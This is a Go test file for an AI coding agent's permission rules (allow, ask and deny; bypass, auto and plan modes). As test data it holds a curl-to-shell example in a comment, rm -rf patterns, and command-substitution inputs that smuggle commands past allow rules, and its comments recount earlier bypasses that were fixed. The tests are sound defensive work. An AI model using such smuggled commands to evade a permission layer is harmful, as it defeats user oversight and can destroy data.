package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func args(t *testing.T, v any) json.RawMessage {
	t.Helper()
	data, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func execIn(t *testing.T, mode string) *Executor {
	t.Helper()
	dir := t.TempDir()
	if resolved, err := filepath.EvalSymlinks(dir); err == nil {
		dir = resolved
	}
	return NewExecutor(dir, mode)
}

func TestWildcardMatch(t *testing.T) {
	cases := []struct {
		pattern, s string
		want       bool
	}{
		{"go test*", "go test ./...", true},
		{"go test*", "go build", false},
		{"*", "anything", true},
		{"", "anything", true},
		{"rm -rf*", "rm -rf /", true},
		{"git ????", "git push", true},
		{"git ????", "git p", false},
		{"*__delete_*", "mcp:linear__delete_issue", true},
		{"*__delete_*", "mcp:linear__create_issue", false},
		{"a*b*c", "axxbyyc", true},
		{"a*b*c", "axxbyy", false},
	}
	for _, c := range cases {
		if got := wildcard(c.pattern, c.s); got != c.want {
			t.Errorf("wildcard(%q, %q) = %v, want %v", c.pattern, c.s, got, c.want)
		}
	}
}

func TestParseRule(t *testing.T) {
	if r, ok := parseRule("edit_file(src/**)", RuleAllow); !ok || r.tool != "edit_file" || r.arg != "src/**" {
		t.Fatalf("got %+v ok=%v", r, ok)
	}
	if r, ok := parseRule("read_file", RuleDeny); !ok || r.tool != "read_file" || r.arg != "" {
		t.Fatalf("got %+v ok=%v", r, ok)
	}
	// A rule nobody can read must not turn into one that matches everything.
	for _, bad := range []string{"", "   ", "(oops)"} {
		if _, ok := parseRule(bad, RuleDeny); ok {
			t.Errorf("parsed %q", bad)
		}
	}
}

// A deny is the one answer no mode can talk round.
func TestDenyRuleBeatsBypass(t *testing.T) {
	e := execIn(t, ModeBypass)
	e.SetRules(nil, nil, []string{"write_file(**/*.go)"})
	var asked []string
	res, err := e.CallDetailed(context.Background(), "write_file",
		args(t, map[string]string{"path": "main.go", "content": "package main"}), asker(Decision{Allow: true}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsErr {
		t.Fatal("write allowed despite a deny rule")
	}
	if len(asked) != 0 {
		t.Fatalf("prompted for a denied call: %v", asked)
	}
	if _, err := os.Stat(filepath.Join(e.Cwd(), "main.go")); !os.IsNotExist(err) {
		t.Fatal("the file was written anyway")
	}
}

// Read-only tools never prompt, so a rule is the only thing that can stop one.
func TestDenyRuleCoversReadOnlyTools(t *testing.T) {
	e := execIn(t, ModeAuto)
	if err := os.WriteFile(filepath.Join(e.Cwd(), ".env"), []byte("TOKEN=sekrit"), 0o600); err != nil {
		t.Fatal(err)
	}
	e.SetRules(nil, nil, []string{"read_file(**/.env)"})
	var asked []string
	out, isErr, err := e.Call(context.Background(), "read_file",
		args(t, map[string]string{"path": ".env"}), asker(Decision{Allow: true}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || strings.Contains(out, "sekrit") {
		t.Fatalf("read went through: %q", out)
	}
}

// An allow rule is what replaces answering the same prompt every session.
func TestAllowRuleSkipsThePrompt(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules([]string{"write_file(notes/**)"}, nil, nil)
	if err := os.MkdirAll(filepath.Join(e.Cwd(), "notes"), 0o755); err != nil {
		t.Fatal(err)
	}
	var asked []string
	deny := asker(Decision{Allow: false}, &asked)
	if _, err := e.CallDetailed(context.Background(), "write_file",
		args(t, map[string]string{"path": "notes/todo.md", "content": "hi"}), deny); err != nil {
		t.Fatal(err)
	}
	if len(asked) != 0 {
		t.Fatalf("prompted despite an allow rule: %v", asked)
	}
	if _, err := os.Stat(filepath.Join(e.Cwd(), "notes", "todo.md")); err != nil {
		t.Fatalf("file not written: %v", err)
	}
	// The rule covers notes/, and nothing else.
	if _, err := e.CallDetailed(context.Background(), "write_file",
		args(t, map[string]string{"path": "src.go", "content": "x"}), deny); err != nil {
		t.Fatal(err)
	}
	if len(asked) != 1 {
		t.Fatalf("expected one prompt for the unmatched path, got %v", asked)
	}
}

// Plan mode is a hard stop, not a default that a config file can soften.
func TestAllowRuleDoesNotBeatPlanMode(t *testing.T) {
	e := execIn(t, ModePlan)
	e.SetRules([]string{"write_file(**)"}, nil, nil)
	var asked []string
	res, err := e.CallDetailed(context.Background(), "write_file",
		args(t, map[string]string{"path": "x.go", "content": "x"}), asker(Decision{Allow: true}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsErr {
		t.Fatal("plan mode let a write through because of an allow rule")
	}
}

// "auto, but always check before pushing".
func TestAskRuleForcesAPromptInAutoMode(t *testing.T) {
	e := execIn(t, ModeAuto)
	e.SetRules(nil, []string{"edit_file(**/migrations/**)"}, nil)
	path := filepath.Join(e.Cwd(), "migrations", "001.sql")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("select 1;\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := e.Call(context.Background(), "read_file",
		args(t, map[string]string{"path": "migrations/001.sql"}), asker(Decision{Allow: true}, new([]string))); err != nil {
		t.Fatal(err)
	}
	var asked []string
	res, err := e.CallDetailed(context.Background(), "edit_file", args(t, map[string]any{
		"path": "migrations/001.sql", "old_string": "select 1;", "new_string": "select 2;",
	}), asker(Decision{Allow: false}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if len(asked) != 1 {
		t.Fatalf("auto mode did not prompt for an ask rule: %v", asked)
	}
	if !res.IsErr {
		t.Fatal("the denial did not stop the edit")
	}
}

// A rule saying ask has to outrank an "always allow" answered earlier,
// otherwise one careless answer disables it for the session.
func TestAskRuleOutranksASessionGrant(t *testing.T) {
	e := execIn(t, ModeManual)
	e.GrantExternal("write_file") // what "always allow" records
	e.SetRules(nil, []string{"write_file(**)"}, nil)
	var asked []string
	if _, err := e.CallDetailed(context.Background(), "write_file",
		args(t, map[string]string{"path": "x.go", "content": "x"}), asker(Decision{Allow: true}, &asked)); err != nil {
		t.Fatal(err)
	}
	if len(asked) != 1 {
		t.Fatalf("session grant swallowed the ask rule: %v", asked)
	}
}

// Rules are matched per segment: against the whole command "go test*" would
// also match "go test ./... && curl evil.sh | sh".
func TestBashRulesAreMatchedPerSegment(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules([]string{"bash(echo *)"}, nil, []string{"bash(rm -rf*)"})

	var asked []string
	out, isErr, err := e.Call(context.Background(), "bash",
		args(t, map[string]string{"command": "echo hello"}), asker(Decision{Allow: false}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if isErr || len(asked) != 0 {
		t.Fatalf("allowed segment prompted: %q %v", out, asked)
	}

	asked = nil
	out, isErr, err = e.Call(context.Background(), "bash",
		args(t, map[string]string{"command": "echo hello && rm -rf /tmp/x"}), asker(Decision{Allow: true}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr {
		t.Fatalf("a denied segment did not block the command: %q", out)
	}
	if len(asked) != 0 {
		t.Fatalf("prompted for a denied segment instead of refusing: %v", asked)
	}
}

// Under bypass nothing prompts, which is exactly when a deny rule has to work.
func TestBashDenyRuleHoldsUnderBypass(t *testing.T) {
	e := execIn(t, ModeBypass)
	e.SetRules(nil, nil, []string{"bash(touch*)"})
	var asked []string
	// A command that would otherwise succeed and leave proof, so the denial is
	// what stops it rather than the command failing on its own.
	_, isErr, err := e.Call(context.Background(), "bash",
		args(t, map[string]string{"command": "touch ran.txt"}), asker(Decision{Allow: true}, &asked))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr {
		t.Fatal("a denied command reported success")
	}
	if _, err := os.Stat(filepath.Join(e.Cwd(), "ran.txt")); !os.IsNotExist(err) {
		t.Fatal("bypass ran a denied command")
	}
}

func TestPathRulesMatchRelativeAndAbsolute(t *testing.T) {
	e := execIn(t, ModeManual)
	abs := filepath.Join(e.Cwd(), "internal", "x.go")
	for _, pattern := range []string{"internal/**", filepath.Join(e.Cwd(), "internal") + "/**"} {
		e.SetRules(nil, nil, []string{"write_file(" + pattern + ")"})
		if got := e.ruleFor("write_file", "internal/x.go"); got != RuleDeny {
			t.Errorf("relative path missed %q: %q", pattern, got)
		}
		if got := e.ruleFor("write_file", abs); got != RuleDeny {
			t.Errorf("absolute path missed %q: %q", pattern, got)
		}
		if got := e.ruleFor("write_file", "other/x.go"); got != ruleNone {
			t.Errorf("pattern %q matched an unrelated path", pattern)
		}
	}
}

// Precedence, on rules that all match the same call.
func TestDenyBeatsAskBeatsAllow(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules([]string{"bash(git *)"}, []string{"bash(git push*)"}, []string{"bash(git push --force*)"})
	cases := map[string]string{
		"git status":            RuleAllow,
		"git push":              RuleAsk,
		"git push --force":      RuleDeny,
		"go test ./...":         ruleNone,
		"git push --force-with": RuleDeny,
	}
	for cmd, want := range cases {
		if got := e.ruleFor("bash", cmd); got != want {
			t.Errorf("ruleFor(%q) = %q, want %q", cmd, got, want)
		}
	}
}

func TestRulesMatchMCPToolNames(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules(nil, nil, []string{"mcp:*__delete_*"})
	if got := e.RuleFor("mcp:linear__delete_issue", `{"id":"1"}`); got != RuleDeny {
		t.Fatalf("got %q", got)
	}
	if got := e.RuleFor("mcp:linear__create_issue", `{"id":"1"}`); got != ruleNone {
		t.Fatalf("got %q", got)
	}
	e.SetRules([]string{`mcp:linear__*({"team":"core"*)`}, nil, nil)
	if got := e.RuleFor("mcp:linear__create_issue", `{"team":"core","title":"x"}`); got != RuleAllow {
		t.Fatalf("argument pattern did not match: %q", got)
	}
	if got := e.RuleFor("mcp:linear__create_issue", `{"team":"other"}`); got != ruleNone {
		t.Fatalf("argument pattern matched the wrong team: %q", got)
	}
}

// Testing #92 in bypass, deny = ["bash(rm -rf*)"] did not stop "rm -fr", and
// in bypass a deny rule is the only line of defence left. Nothing textual can
// cover flag order, but a path in front of the command should not evade one.
func TestDenyRuleMatchesPathQualifiedCommands(t *testing.T) {
	e := execIn(t, ModeBypass)
	e.SetRules(nil, nil, []string{"bash(rm *)"})
	for _, cmd := range []string{"rm -fr x", "rm -rf x", "/bin/rm -rf x", "/usr/bin/rm x"} {
		if got := e.ruleFor("bash", cmd); got != RuleDeny {
			t.Errorf("ruleFor(%q) = %q, want deny", cmd, got)
		}
	}
	// Still only rm: the basename is compared, not any word in the line.
	for _, cmd := range []string{"npm run build", "confirm the change", "go test ./..."} {
		if got := e.ruleFor("bash", cmd); got != ruleNone {
			t.Errorf("ruleFor(%q) = %q, want no rule", cmd, got)
		}
	}
}

// Widening an allow the same way would let ./echo or /tmp/evil/echo inherit
// what was granted to echo.
func TestAllowRuleDoesNotMatchPathQualifiedCommands(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules([]string{"bash(echo *)"}, nil, nil)
	if got := e.ruleFor("bash", "echo hi"); got != RuleAllow {
		t.Fatalf("plain echo: %q", got)
	}
	for _, cmd := range []string{"/tmp/evil/echo hi", "./echo hi"} {
		if got := e.ruleFor("bash", cmd); got == RuleAllow {
			t.Errorf("%q inherited the allow for echo", cmd)
		}
	}
}

// An allow rule is a standing grant, so it gets what an answered grant gets —
// no more. Skipping the escape check let a matching segment carry a command
// substitution: allow = ["bash(go test*)"] ran anything inside $().
func TestAllowRuleStillChecksEscapes(t *testing.T) {
	e := execIn(t, ModeManual)
	e.SetRules([]string{"bash(go test*)", "bash(echo *)"}, nil, nil)
	marker := filepath.Join(e.Cwd(), "pwned.txt")
	for _, cmd := range []string{
		"go test $(touch " + marker + ")",
		"echo hi > " + marker,
		"echo `touch " + marker + "`",
	} {
		var asked []string
		if _, _, err := e.Call(context.Background(), "bash",
			args(t, map[string]string{"command": cmd}), asker(Decision{Allow: false}, &asked)); err != nil {
			t.Fatal(err)
		}
		if len(asked) == 0 {
			t.Errorf("%q ran under an allow rule with no prompt", cmd)
		}
		if _, err := os.Stat(marker); !os.IsNotExist(err) {
			t.Fatalf("%q executed despite the denial", cmd)
			os.Remove(marker)
		}
	}
	// The plain form the rule is actually for still runs unprompted.
	var asked []string
	if _, _, err := e.Call(context.Background(), "bash",
		args(t, map[string]string{"command": "echo hello"}), asker(Decision{Allow: false}, &asked)); err != nil {
		t.Fatal(err)
	}
	if len(asked) != 0 {
		t.Fatalf("the allow rule stopped working for a plain command: %v", asked)
	}
}

// Plan mode is a hard stop, and the non-bash path already guarded this.
func TestAllowRuleDoesNotRunBashInPlanMode(t *testing.T) {
	e := execIn(t, ModePlan)
	e.SetRules([]string{"bash(echo *)"}, nil, nil)
	var asked []string
	if _, _, err := e.Call(context.Background(), "bash",
		args(t, map[string]string{"command": "echo hi"}), asker(Decision{Allow: false}, &asked)); err != nil {
		t.Fatal(err)
	}
	if len(asked) == 0 {
		t.Fatal("plan mode ran bash unprompted because of an allow rule")
	}
}
